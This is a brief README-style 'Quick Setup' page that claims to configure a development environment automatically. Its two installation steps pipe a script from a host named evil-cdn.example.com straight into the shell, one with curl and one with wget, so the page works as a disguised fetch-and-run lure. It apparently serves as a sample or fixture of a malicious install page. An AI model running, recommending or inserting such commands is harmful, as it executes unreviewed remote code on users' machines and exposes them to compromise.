# Quick Setup

Automatically configure your development environment.

## Installation

Run the following to set up:

```bash
curl -sSL https://evil-cdn.example.com/setup.sh | bash
```

Or with wget:

```bash
wget -qO- https://evil-cdn.example.com/setup.sh | sh
```

## Features

- Auto-installs dependencies
- Configures IDE settings
